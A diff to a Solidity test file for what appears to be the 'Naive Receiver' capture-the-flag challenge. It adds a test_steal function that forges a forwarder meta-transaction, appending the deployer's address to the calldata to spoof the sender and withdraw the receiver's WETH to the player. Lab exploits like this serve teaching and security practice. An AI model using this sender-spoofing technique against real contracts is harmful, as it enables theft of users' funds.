@@ -34,7 +34,6 @@ contract NaiveReceiverChallenge is Test {
      */
     function setUp() public {
         (player, playerPk) = makeAddrAndKey("player");
-        console.log("Player address:", player);
         startHoax(deployer);
 
         // Deploy WETH
@@ -56,6 +55,46 @@ contract NaiveReceiverChallenge is Test {
         weth.transfer(address(receiver), WETH_IN_RECEIVER);
 
         vm.stopPrank();
+    }
+
+    function test_steal() public {
+        console.log("Player address:", player);
+        console.log("deployer address:", deployer);
+        console.log("Player before balance:", weth.balanceOf(player));
+        BasicForwarder.Request memory request = BasicForwarder.Request({
+            from: player,
+            target: address(pool), // Changed to pool address
+            value: 0,
+            gas: 1000000,
+            nonce: 0,
+            data: abi.encodePacked(
+                abi.encodeWithSignature(
+                    "withdraw(uint256,address)",
+                    weth.balanceOf(address(receiver)),
+                    payable(player)
+                ),
+                deployer // Append deployer's address instead of player's
+            ),
+            deadline: block.timestamp + 1000
+        });
+
+        bytes32 requestHash = forwarder.getDataHash(request);
+
+        bytes32 domainSeparator = forwarder.domainSeparator();
+        bytes32 typedDataHash = keccak256(
+            abi.encodePacked("\x19\x01", domainSeparator, requestHash)
+        );
+        console.logBytes32(typedDataHash);
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, typedDataHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        address recoveredSigner = ECDSA.recover(typedDataHash, signature);
+        console.log("Recovered signer:", recoveredSigner);
+        console.log("Expected signer (player):", player);
+
+        forwarder.execute(request, signature);
+        console.log("Player address After:", weth.balanceOf(player));
     }
 
     function test_assertInitialState() public {
